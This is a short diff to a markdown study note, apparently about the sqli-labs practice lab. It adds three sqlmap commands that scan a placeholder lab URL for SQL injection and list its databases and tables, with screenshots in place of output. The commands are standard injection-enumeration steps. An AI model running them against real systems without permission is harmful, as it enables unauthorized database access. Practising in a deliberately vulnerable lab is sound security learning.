@@ -83,4 +83,13 @@
 
 ![image](assets/image-20251107195933-fldm5x8.png)
 
-　　‍
+---
+**sqlmap**
+
+sqlmap -u "ip/Less-1/?id=1"  #
+![[Pasted image 20260529161026.png]]
+
+sqlmap -u "ip/Less-1/?id=1" --dbs
+![[Pasted image 20260529161331.png]]
+sqlmap -u "ip/Less-1/?id=1" -D security --tables
+![[Pasted image 20260529161542.png]]
